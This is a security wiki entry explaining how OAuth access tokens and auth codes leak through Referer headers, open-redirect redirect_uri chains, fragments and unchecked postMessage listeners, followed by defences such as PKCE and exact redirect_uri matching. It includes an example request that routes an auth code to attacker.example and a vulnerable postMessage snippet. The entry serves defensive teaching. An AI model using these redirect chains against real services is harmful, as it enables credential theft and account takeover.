---
title: OAuth Token Leak Vectors
slug: oauth-token-leak-vectors
---

> **TL;DR:** Access tokens and authorisation codes leak through Referer headers, open-redirect `redirect_uri` chains, URL fragments, sloppy `postMessage` listeners, and covert-redirect abuses of trusted clients.

## What it is
OAuth 2.0 places sensitive material (auth codes, implicit-flow access tokens, `id_token` JWTs) into URLs and browser-controlled channels. Any leakage of that URL or fragment to a third party hands the attacker the credential. The recurring vectors are: `Referer` leakage to embedded content on the callback page, open redirects allowing `redirect_uri` to bounce tokens off the legitimate host, attacker-controlled fragments surviving redirects, `window.postMessage` handlers accepting wildcard origins, and covert redirect via under-validated `redirect_uri` matching.

## Preconditions / where it applies
- Authorization server allows implicit (`response_type=token` or `id_token`) or hybrid flow — still common for SPAs without PKCE migration
- Client-side callback page loads third-party scripts, pixels, or images
- `redirect_uri` validation uses substring/prefix matching, or the allowlist contains a host with an open redirect
- Callback page implements `postMessage` to communicate the token to the parent window without checking `event.origin`
- No `Referrer-Policy: no-referrer` header on the callback route

## Technique
Referer leak via implicit flow — the access token lives in the URL fragment, and any subresource fetched from that page sees the full URL in `Referer` on some browsers (and the path on all):

```http
GET /callback#access_token=eyJ...&token_type=Bearer HTTP/1.1
Host: client.example
Referer: https://provider.example/authorize?...
```

If `/callback` loads `https://analytics.thirdparty/px.gif`, the third party receives a Referer including the token-bearing path. Fragments are not sent in Referer by spec, but server-side logs and JavaScript-driven `fetch` calls reading `location.href` regularly leak them.

Open-redirect chained `redirect_uri` (covert redirect):

```http
GET /authorize?client_id=app&response_type=code&redirect_uri=https://client.example/redirect?to=https://attacker.example&scope=email HTTP/1.1
Host: provider.example
```

If `client.example/redirect?to=` is an open redirect, the auth code arrives at `attacker.example` with the auth code in the query string.

PostMessage leak — vulnerable callback:

```javascript
// vulnerable parent
window.addEventListener("message", e => {
  // missing: if (e.origin !== "https://client.example") return;
  document.cookie = `token=${e.data.token}`;
});

// attacker iframe
top.postMessage({ token: stealMe }, "*");
```

Fragment-survival trick: open redirects implemented with `Location: https://attacker.example` preserve the original URL fragment in most browsers, so a 302 from the callback to an attacker page hands over `#access_token=...`.

## Detection and defence
- Mandate Authorization Code + PKCE; deprecate implicit and hybrid flows entirely
- Exact-string match on `redirect_uri` — no wildcards, no prefix matching, no query-string allowance
- Set `Referrer-Policy: no-referrer` on the callback route and avoid loading third-party content there
- In `postMessage` consumers, always check `event.origin` against an allowlist and verify `event.source`
- Short-lived auth codes (≤ 60 s), single use, bound to PKCE `code_verifier` and client IP where feasible
- Rotate and revoke tokens on any anomalous `Referer` or unexpected client IP
- Periodically scan client allowlists for open redirects on accepted `redirect_uri` hosts

## References
- [OAuth 2.0 Security Best Current Practice (RFC 9700)](https://datatracker.ietf.org/doc/rfc9700/) — current threat model
- [OAuth covert redirect overview](https://oauth.net/articles/authentication/) — flow-level guidance

See also: [[oauth-flows]], [[oauth-token-theft]], [[open-redirect]], [[postmessage-bugs]].
